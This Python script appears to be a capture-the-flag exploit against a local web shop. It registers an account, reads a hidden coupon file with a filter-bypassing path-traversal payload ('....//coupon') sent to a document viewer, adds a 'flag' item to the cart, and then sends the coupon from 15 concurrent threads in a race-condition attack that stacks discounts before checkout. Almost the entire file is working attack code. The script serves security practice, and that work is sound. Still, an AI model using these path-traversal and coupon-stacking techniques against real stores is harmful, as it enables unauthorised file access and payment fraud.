import requests
import threading
import sys
import time

URL = "http://localhost:5001"
USERNAME = "stacker_" + str(int(time.time()))
COUPON = "SHADOW_DISCOUNT"

def apply_coupon(session):
    try:
        resp = session.post(f"{URL}/cart/apply_coupon", data={"code": COUPON})
    except:
        pass

def main():
    # 1. Login
    s = requests.Session()
    s.post(f"{URL}/register", data={"username": USERNAME})
    print(f"[*] Logged in as {USERNAME}.")

    # 2. Path Traversal to get coupon
    print("[*] Exploiting Path Traversal to read 'coupon'...")
    payload = "....//coupon"
    resp = s.get(f"{URL}/doc_viewer", params={"doc": payload})
    
    if COUPON not in resp.text:
        print("[-] Failed to read coupon file.")
        sys.exit(1)
    print(f"[+] Found Coupon: {COUPON}")

    # 3. Add Flag to Cart
    print("[*] Adding Flag to Cart...")
    s.post(f"{URL}/cart/add", data={"item": "flag"})

    # 4. Race Condition Attack (Coupon Stacking)
    print("[*] Launching Coupon Stacking Attack (15 threads)...")
    threads = []
    for _ in range(15):
        t = threading.Thread(target=apply_coupon, args=(s,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

    # 5. Checkout
    print("[*] Attempting Checkout...")
    final = s.post(f"{URL}/checkout/pay").json()
    
    if 'flag' in final:
        print(f"\n>>> FLAG: {final['flag']} <<<\n")
    else:
        print(f"[-] Failed. Msg: {final.get('msg')}")

if __name__ == "__main__":
    main()
